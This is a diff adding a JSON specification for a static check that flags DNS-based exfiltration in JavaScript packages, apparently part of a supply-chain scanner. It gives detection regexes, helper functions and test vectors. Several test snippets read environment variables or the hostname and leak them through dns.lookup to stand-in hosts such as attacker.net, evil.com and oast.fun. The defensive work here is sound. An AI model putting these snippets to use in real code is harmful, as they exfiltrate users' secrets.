@@ -1,0 +1,244 @@
+{
+ "static_checks_version": "static-checks-1.10",
+ "source": "recon v6.25 static-checks.mjs (sealed investigations/recon/v6.25, manifest RECON-v6.25.SHA256SUMS 7e356955, static-checks.mjs e0105c45), branch g10-c2-recon-v6.25",
+ "changes_from_1_9": [
+  "S0 and S6 DNS arm (dnsExfil): a node dns call (NODE_DNS_CALL, unchanged) is not counted when its first argument is a plain string literal (single or double quotes, or a backtick), followed (after whitespace) by , or ) so nothing is joined to it, and its host is a reserved name (reservedDnsName; DNS_LABELS rejects a ${, an escape or a newline, so such a call is counted). The unit fires when NODE_DNS_CALL and DNS_DATA match (unchanged) AND (DNS_CUSTOM_SERVER matches the unit OR at least one dns call is counted).",
+  "reservedDnsName: lower-case, one trailing dot removed, must match DNS_LABELS; then localhost, or ends in .invalid / .example / .test / .localhost with at least one label before it (RFC 2606, RFC 6761). A bare TLD is not reserved.",
+  "DNS_CUSTOM_SERVER: a unit that calls setServers( or Resolver( excludes nothing: a query for any name reaches the server the code chose.",
+  "Not changed: NODE_DNS_CALL, DNS_DATA, the S6 beacon branch (network API sink + host identity, no execution sink), S1-S5, S7-S9, the facts, every gate, class, role, notice and excerpt text. A dns module bound to another name is still not read (as 1.9)."
+ ],
+ "dns": {
+  "node_dns_call": "\\b(?:dns(?:\\.promises)?|require\\(\\s*['\"](?:node:)?dns(?:\\/promises)?['\"]\\s*\\)(?:\\.promises)?)\\s*\\.\\s*(?:lookup|lookupService|resolve(?:4|6|Any|Cname|Mx|Ns|Txt|Srv|Ptr|Soa|Naptr|Caa)?|reverse)\\s*\\(",
+  "dns_data": "\\bprocess\\.(?:cwd\\s*\\(|env\\b|argv\\b)|\\b(?:os|require\\(\\s*['\"](?:node:)?os['\"]\\s*\\))\\s*\\.\\s*(?:hostname|userInfo|homedir|networkInterfaces)\\s*\\(|\\b__dirname\\b",
+  "reserved_dns_suffixes": [
+   ".invalid",
+   ".example",
+   ".test",
+   ".localhost"
+  ],
+  "reserved_dns_names": [
+   "localhost"
+  ],
+  "dns_custom_server": "\\b(?:setServers|Resolver)\\s*\\(",
+  "dns_labels": "^[a-z0-9-]+(?:\\.[a-z0-9-]+)*$",
+  "reserved_dns_name": "export function reservedDnsName(h) {\n  if (typeof h !== 'string') return false;\n  const n = h.toLowerCase().replace(/\\.$/, '');\n  if (!DNS_LABELS.test(n)) return false;\n  return RESERVED_DNS_NAMES.includes(n) || RESERVED_DNS_SUFFIXES.some((x) => n.endsWith(x) && n.length > x.length);\n}",
+  "dns_calls": "export function dnsCalls(s) {\n  const out = []; if (typeof s !== 'string') return out;\n  for (const m of s.matchAll(new RegExp(NODE_DNS_CALL.source, 'g'))) {\n    let i = m.index + m[0].length; while (i < s.length && /\\s/.test(s[i])) i += 1;\n    const q = s[i]; let host = null;\n    if (q === \"'\" || q === '\"' || q === '`') {\n      const end = s.indexOf(q, i + 1); const body = end < 0 ? null : s.slice(i + 1, end);\n      if (body !== null) {   // an escape, a newline or a ${ in the body never passes DNS_LABELS, so such a call is counted\n        let j = end + 1; while (j < s.length && /\\s/.test(s[j])) j += 1;\n        if (s[j] === ',' || s[j] === ')') host = body;\n      }\n    }\n    out.push({ index: m.index, host });\n  }\n  return out;\n}",
+  "dns_exfil": "export const dnsExfil = (s) => typeof s === 'string' && NODE_DNS_CALL.test(s) && DNS_DATA.test(s)\n  && (DNS_CUSTOM_SERVER.test(s) || dnsCalls(s).some((c) => !reservedDnsName(c.host)));   // v6.25: was NODE_DNS_CALL && DNS_DATA (1.9)",
+  "measured": "the 9 v6.23 DNS-arm fires (dns-measure out.jsonl 09c38ff6; tarballs evicted 11-05, so scored on the dns call lines kept in recon capture reports): 8 still fire under 1.10 (all 5 MAL-labelled + 3 unlabelled probes, each a data-joined name), 1 drops (@jarvis_1234/env-harvest 1.0.4, the RF-9 case). 1.10 only narrows 1.9, so no other unit of the 3,404 can change."
+ },
+ "test_vectors": {
+  "dns_exfil": [
+   {
+    "unit": "const os=require('os');const dns=require('dns');const i={h:os.hostname(),e:JSON.stringify(process.env)};\n  dns.lookup('collector.scml-lab.invalid', () => {});",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "env-harvest 1.0.4 shape: reserved name in a plain literal"
+   },
+   {
+    "unit": "dns.lookup(\"collector.scml-lab.invalid\", () => {}); const h = os.hostname();",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "double quotes"
+   },
+   {
+    "unit": "dns.lookup(`probe.example`, cb); process.env.HOME;",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "backtick without interpolation"
+   },
+   {
+    "unit": "require('node:dns').promises.resolveTxt( 'a.b.test' ); process.cwd();",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "promises receiver, spaces around the argument"
+   },
+   {
+    "unit": "dns.resolve4('localhost', cb); os.userInfo();",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "bare localhost"
+   },
+   {
+    "unit": "dns.lookup('Collector.INVALID.', cb); process.argv;",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "case and one trailing dot folded"
+   },
+   {
+    "unit": "dns.lookup('x.localhost'); dns.lookup('y.invalid', cb); __dirname;",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "every call reserved"
+   },
+   {
+    "unit": "node -e \"require('dns').lookup('collector.scml-lab.invalid',()=>{});console.log(process.env.npm_package_name)\"",
+    "expect_1_10": false,
+    "was_1_9": true,
+    "why": "S0: inline node hook command"
+   },
+   {
+    "unit": "dns.lookup(d+\".x.example.invalid\",()=>{}); const d = process.cwd();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "data joined to a reserved suffix (the measured shape)"
+   },
+   {
+    "unit": "dns.lookup('a.' + os.hostname() + '.invalid', cb);",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "literal start, data joined"
+   },
+   {
+    "unit": "dns.lookup('x.invalid' + process.env.USER, cb);",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "data joined after the literal"
+   },
+   {
+    "unit": "dns.lookup(`${os.hostname()}.x.invalid`, cb);",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "template with interpolation"
+   },
+   {
+    "unit": "dns.lookup(host, cb); process.env.X;",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "variable host"
+   },
+   {
+    "unit": "dns.lookup('collector.attacker.net', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "non-reserved literal"
+   },
+   {
+    "unit": "dns.lookup('x.invalid.evil.com', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "look-alike: reserved label inside"
+   },
+   {
+    "unit": "dns.lookup('invalid.com', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "look-alike"
+   },
+   {
+    "unit": "dns.lookup('localhost.evil.com', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "look-alike"
+   },
+   {
+    "unit": "dns.lookup('x\\x2einvalid', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "escape in the literal"
+   },
+   {
+    "unit": "dns.lookup('ok.invalid', cb); dns.lookup(Buffer.from(process.cwd()).toString('hex') + '.oast.fun', cb);",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "one reserved call beside one counted call"
+   },
+   {
+    "unit": "dns.lookup('unterminated.invalid, cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "unterminated literal"
+   },
+   {
+    "unit": "dns.setServers(['203.0.113.7']); dns.lookup('collector.scml-lab.invalid', cb); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "custom server: setServers"
+   },
+   {
+    "unit": "const { Resolver } = require('dns').promises; const r = new Resolver(); dns.lookup('a.test'); os.hostname();",
+    "expect_1_10": true,
+    "was_1_9": true,
+    "why": "custom server: Resolver"
+   },
+   {
+    "unit": "dns.lookup('registry.npmjs.org', cb);",
+    "expect_1_10": false,
+    "was_1_9": false,
+    "why": "no process or host data (unchanged)"
+   },
+   {
+    "unit": "dns.setServers(['203.0.113.7']); process.env.X;",
+    "expect_1_10": false,
+    "was_1_9": false,
+    "why": "custom server and process data, but no dns call"
+   }
+  ],
+  "reserved_dns_name": [
+   {
+    "host": "a.invalid",
+    "expect": true
+   },
+   {
+    "host": "A.B.INVALID",
+    "expect": true
+   },
+   {
+    "host": "x.example.",
+    "expect": true
+   },
+   {
+    "host": "probe.test",
+    "expect": true
+   },
+   {
+    "host": "localhost",
+    "expect": true
+   },
+   {
+    "host": "LocalHost.",
+    "expect": true
+   },
+   {
+    "host": "x.localhost",
+    "expect": true
+   },
+   {
+    "host": "invalid",
+    "expect": false
+   },
+   {
+    "host": "test",
+    "expect": false
+   },
+   {
+    "host": "example",
+    "expect": false
+   },
+   {
+    "host": ".invalid",
+    "expect": false
+   },
+   {
+    "host": "a.invalid.com",
+    "expect": false
+   },
+   {
+    "host": "example.com",
+    "expect": false
+   },
+   {
+    "host": "a.testing",
+    "expect": false
+   },
+   {
+    "host": "a b.invalid",
+    "expect": false
+   },
+   {
+    "host": "",
+    "expect": false
+   }
+  ]
+ },
+ "unchanged": "S1-S5, S7, S8, S9, the S6 beacon branch, the facts (1.8.1), every gate, class, role and notice; S0 and S6 change only through dnsExfil"
+}
